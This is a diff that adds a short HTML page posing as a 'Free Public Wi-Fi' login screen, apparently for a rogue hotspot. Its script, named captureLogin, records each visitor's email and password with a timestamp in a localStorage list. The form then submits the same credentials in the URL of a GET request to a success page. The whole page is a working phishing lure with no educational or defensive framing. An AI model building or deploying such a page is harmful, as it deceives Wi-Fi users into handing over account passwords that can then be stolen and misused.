@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Public Wi-Fi</title>
+  <style>
+    body { font-family: Arial; text-align: center; margin-top: 100px; }
+    input { padding: 10px; margin: 10px; width: 220px; }
+  </style>
+</head>
+<body>
+  <h2>Login to access Free Wi-Fi</h2>
+  <form action="upsucess.html" method="GET" onsubmit="return captureLogin()">
+    <input type="email" id="email" name="email" placeholder="Email address" required><br>
+    <input type="password" id="password" name="password" placeholder="Password" required><br>
+    <input type="submit" value="Connect">
+  </form>
+
+  <script>
+    function captureLogin() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      let logins = JSON.parse(localStorage.getItem("loginAttempts") || "[]");
+      logins.push({
+        email: email,
+        password: password,
+        time: new Date().toLocaleString()
+      });
+      localStorage.setItem("loginAttempts", JSON.stringify(logins));
+      return true;
+    }
+  </script>
+</body>
+</html>
